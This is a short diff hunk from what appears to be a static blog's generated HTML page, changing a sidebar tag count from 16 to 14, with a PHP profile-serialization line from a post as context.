@@ -1223,7 +1208,7 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
